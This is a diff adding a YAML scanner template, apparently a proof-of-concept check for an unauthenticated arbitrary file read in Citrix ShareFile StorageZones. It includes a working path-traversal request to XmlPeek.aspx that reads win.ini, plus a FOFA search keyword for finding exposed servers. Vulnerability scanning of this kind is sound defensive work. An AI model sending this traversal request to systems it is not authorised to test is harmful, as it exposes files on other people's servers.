@@ -1,0 +1,16 @@
+name: poc-yaml-Citrix-ShareFile-StorageZones-Unauthenticated-Arbitrary-File-Read
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /XmlPeek.aspx?dt=\\..\\..\\..\\..\\..\\..\\Windows\\win.ini&x=/validate.ashx?requri
+        expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"extensions") && response.body.bcontains(b"fonts")
+expression: r0()
+detail:
+    author: cysec
+    links:
+        - http://cysec.com
+    fofakeyword: title="ShareFile Storage Server"
